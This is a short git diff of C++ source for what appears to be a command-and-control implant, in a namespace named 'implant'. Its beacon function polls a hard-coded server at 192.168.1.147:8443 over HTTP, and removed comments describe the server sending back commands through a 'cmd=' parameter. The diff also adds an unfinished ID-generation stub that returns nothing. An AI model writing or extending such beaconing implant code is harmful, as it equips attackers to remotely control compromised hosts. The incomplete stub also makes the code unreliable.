@@ -5,6 +5,7 @@
 #include <random>
 #include <stdexcept>
 #include <iostream>
+#include "xcore.h"
 
 namespace implant {
 
@@ -16,12 +17,12 @@ namespace implant {
     // Receive token
     // set isRunning to true
 }
-
 */
-// Make a get request to the server with the ID
-// Server will respond with or without a cmd= parameter.
-// If no cmd= parameter then continue loop
-// 
+
+std::string initConnection() {
+    xcore::generateID();
+    
+}
 
 bool isRunning = true;
 
@@ -30,7 +31,7 @@ std::string beacon() {
         try {
             std::string url = "http://192.168.1.147:8443/home";
             std::cerr << url << std::endl;
-            std::string response = xhttp::http_get(url); // Add params back
+            std::string response = xhttp::http_get(url);
             std::cerr << response << std::endl;
             return response;
             // Define base wait time and max jitter
